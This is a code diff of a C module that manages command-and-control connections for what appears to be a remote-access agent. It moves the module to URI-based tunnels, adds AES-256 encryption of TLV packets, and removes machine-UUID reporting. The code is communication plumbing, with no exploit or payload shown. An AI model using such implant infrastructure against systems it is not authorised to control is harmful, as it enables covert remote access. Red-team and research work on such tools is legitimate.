@@ -43,7 +43,6 @@
 #include <link.h>
 #include <group.h>
 #include <tlv_types.h>
-#include <machine.h>
 
 #include <uthash/uthash.h>
 
@@ -55,7 +54,6 @@
 c2_t *c2_create(int id)
 {
     c2_t *c2;
-    char uuid[UUID_SIZE];
 
     c2 = calloc(1, sizeof(*c2));
 
@@ -65,67 +63,51 @@ c2_t *c2_create(int id)
     }
 
     c2->id = id;
-    machine_uuid(uuid);
-    c2->uuid = strdup(uuid);
-
-    c2->dynamic.t_count = 0;
-    c2->dynamic.n_count = 0;
-    c2->dynamic.tabs = NULL;
-    c2->dynamic.api_calls = NULL;
-    c2->dynamic.pipes = NULL;
+    c2->pipes = NULL;
+    c2->crypt = crypt_create();
+    crypt_set_algo(c2->crypt, ALGO_AES256_CBC);
 
     return c2;
 }
 
-int c2_add_sock(c2_t **c2_table, int id, int sock, int proto)
+int c2_add_uri(c2_t **c2_table, int id, char *uri, tunnels_t *tunnels)
 {
     c2_t *c2;
+    tunnels_t *tunnel;
 
     c2 = c2_create(id);
 
-    if (c2 != NULL)
+    if (c2 == NULL)
     {
-        c2->net = net_create(sock, sock, proto);
-
-        if (c2->net == NULL)
-        {
-            goto fail;
-        }
-
-        if (net_block_sock(c2->net->in) != 0)
-        {
-            goto fail;
-        }
-
-        return c2_add(c2_table, c2);
+        return -1;
     }
 
-    return -1;
+    tunnel = tunnel_find(tunnels, uri);
+    if (tunnel == NULL)
+    {
+        log_debug("* Failed to find protocol for (%s)\n", uri);
+        goto fail;
+    }
+
+    c2->tunnel = tunnel_create(tunnel);
+    if (c2->tunnel == NULL)
+    {
+        log_debug("* Failed to create tunnel for C2 (%d)\n", c2->id);
+        goto fail;
+    }
+
+    tunnel_set_uri(c2->tunnel, uri);
+
+    if (c2_add(c2_table, c2) < 0)
+    {
+        log_debug("* Failed to add C2 to C2 table (%d)\n", c2->id);
+        goto fail;
+    }
+
+    return 0;
 
 fail:
-    c2_destroy(c2);
-    return -1;
-}
-
-int c2_add_file(c2_t **c2_table, int id, int in, int out)
-{
-    c2_t *c2;
-
-    c2 = c2_create(id);
-
-    if (c2 != NULL)
-    {
-        c2->net = net_create(in, out, NET_PROTO_FILE);
-
-        if (c2->net == NULL)
-        {
-            c2_destroy(c2);
-            return -1;
-        }
-
-        return c2_add(c2_table, c2);
-    }
-
+    free(c2);
     return -1;
 }
 
@@ -137,37 +119,20 @@ int c2_add(c2_t **c2_table, c2_t *c2_new)
     id = c2_new->id;
     HASH_FIND_INT(*c2_table, &id, c2);
 
-    if (c2 == NULL)
+    if (c2 != NULL)
     {
-        HASH_ADD_INT(*c2_table, id, c2_new);
-        log_debug("* Added C2 entry (%d) - (%s)\n", id, c2_new->uuid);
-
-        return 0;
+        return -1;
     }
 
-    return -1;
-}
-
-void c2_destroy(c2_t *c2)
-{
-    tabs_free(c2->dynamic.tabs);
-
-    if (c2->uuid != NULL)
-    {
-        free(c2->uuid);
-    }
-
-    net_free(c2->net);
-    sigar_close(c2->sigar);
-    api_calls_free(c2->dynamic.api_calls);
-    api_pipes_free(c2->dynamic.pipes);
-
-    free(c2);
+    HASH_ADD_INT(*c2_table, id, c2_new);
+    log_debug("* Added C2 entry (%d)\n", id);
+    return 0;
 }
 
 void c2_set_links(c2_t *c2_table,
                   link_t read_link,
                   link_t write_link,
+                  link_event_t event_link,
                   void *data)
 {
     c2_t *c2;
@@ -176,78 +141,69 @@ void c2_set_links(c2_t *c2_table,
     {
         c2->read_link = read_link;
         c2->write_link = write_link;
+        c2->event_link = event_link;
         c2->link_data = data != NULL ? data : c2;
     }
 }
 
 ssize_t c2_dequeue_tlv(c2_t *c2, tlv_pkt_t **tlv_pkt)
 {
-    return group_tlv_dequeue(c2->net->ingress, tlv_pkt);
+    return group_tlv_dequeue(c2->tunnel->ingress, tlv_pkt, c2->crypt);
 }
 
 int c2_enqueue_tlv(c2_t *c2, tlv_pkt_t *tlv_pkt)
 {
-    if (group_tlv_enqueue(c2->net->egress, tlv_pkt) == 0)
+    if (group_tlv_enqueue(c2->tunnel->egress, tlv_pkt, c2->crypt) < 0)
     {
-        if (c2->write_link)
-        {
-            c2->write_link(c2->link_data);
-        }
-
-        return 0;
+        return -1;
     }
 
-    return -1;
-}
-
-void c2_enqueue_uuid(c2_t *c2_table)
-{
-    c2_t *c2;
-    c2_t *c2_tmp;
-    tlv_pkt_t *tlv_pkt;
-
-    HASH_ITER(hh, c2_table, c2, c2_tmp)
+    if (c2->write_link)
     {
-        log_debug("* Sending UUID to C2 (%d) - (%s)\n",
-                  c2->id, c2->uuid);
-
-        tlv_pkt = tlv_pkt_create();
-        tlv_pkt_add_string(tlv_pkt, TLV_TYPE_UUID, c2->uuid);
-        c2_enqueue_tlv(c2, tlv_pkt);
-        tlv_pkt_destroy(tlv_pkt);
+        c2->write_link(c2->link_data);
     }
+
+    return 0;
 }
 
-void c2_setup(c2_t *c2_table, struct ev_loop *loop)
+void c2_setup(c2_t *c2_table, struct ev_loop *loop, void *data)
 {
     c2_t *c2;
     c2_t *c2_tmp;
 
     HASH_ITER(hh, c2_table, c2, c2_tmp)
     {
-        log_debug("* Initializing C2 server (%d) - (%s)\n",
-                  c2->id, c2->uuid);
+        log_debug("* Initializing C2 server (%d)\n",
+                  c2->id);
 
         c2->loop = loop;
-        sigar_open(&c2->sigar);
 
-        net_set_links(c2->net, c2->read_link, c2->write_link, c2->link_data);
-        net_setup(c2->net, c2->loop);
+        tunnel_setup(c2->tunnel, c2->loop);
+        tunnel_set_links(c2->tunnel, c2->read_link,
+                         c2->write_link, c2->event_link,
+                         c2->link_data);
 
-        register_pipe_api_calls(&c2->dynamic.api_calls);
-
-        switch (c2->type)
+        if (tunnel_init(c2->tunnel) < 0)
         {
-            case C2_CORE:
-                api_calls_register(&c2->dynamic.api_calls);
-                api_pipes_register(&c2->dynamic.pipes);
-                break;
-            case C2_TAB:
-                register_tab_api_calls(&c2->dynamic.api_calls);
-                break;
-            default:
-                break;
+            log_debug("* Failed to initialize tunnel for C2 (%d)\n", c2->id);
         }
+
+        c2->data = data;
+    }
+}
+
+void c2_start(c2_t *c2_table)
+{
+    c2_t *c2;
+    c2_t *c2_tmp;
+
+    HASH_ITER(hh, c2_table, c2, c2_tmp)
+    {
+        log_debug("* Starting C2 server (%d)\n",
+                  c2->id);
+
+        api_pipes_register(&c2->pipes);
+        tunnel_start(c2->tunnel);
     }
 }
 
@@ -258,11 +214,15 @@ void c2_free(c2_t *c2_table)
 
     HASH_ITER(hh, c2_table, c2, c2_tmp)
     {
-        log_debug("* Freeing C2 server (%d) - (%s)\n",
-                  c2->id, c2->uuid);
+        log_debug("* Freeing C2 server (%d)\n",
+                  c2->id);
 
         HASH_DEL(c2_table, c2);
-        c2_destroy(c2);
+
+        api_pipes_free(c2->pipes);
+        tunnel_free(c2->tunnel);
+        crypt_free(c2->crypt);
+        free(c2);
     }
 
     free(c2_table);
